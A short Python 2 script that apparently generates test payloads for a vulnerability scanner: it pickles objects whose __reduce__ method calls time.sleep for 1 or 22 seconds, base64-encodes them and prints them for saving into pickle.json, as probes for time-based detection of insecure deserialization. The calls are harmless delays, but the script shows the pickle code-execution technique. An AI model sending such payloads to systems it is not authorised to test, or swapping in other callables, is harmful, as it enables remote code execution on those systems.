import cPickle
import time
import base64


class DelayUsingSleep1(object):
    def __reduce__(self):
        return time.sleep, (1,)


class DelayUsingSleep22(object):
    def __reduce__(self):
        return time.sleep, (22,)


dump = cPickle.dumps(DelayUsingSleep1())
payload = base64.b64encode(dump)

print('Save this to pickle.json "1": %s' % payload)

dump = cPickle.dumps(DelayUsingSleep22())
payload = base64.b64encode(dump)

print('Save this to pickle.json "2": %s' % payload)

print('Manually check the offsets of the 1 and 22 strings and save them to pickle.json')
